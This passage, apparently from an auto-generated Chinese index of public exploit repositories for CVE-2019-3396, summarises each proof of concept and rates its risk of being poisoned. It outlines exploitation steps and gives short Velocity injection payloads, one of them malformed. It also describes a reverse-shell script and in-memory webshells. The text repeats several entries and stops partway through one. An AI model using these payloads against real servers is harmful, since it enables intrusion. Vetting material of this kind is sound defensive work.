提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

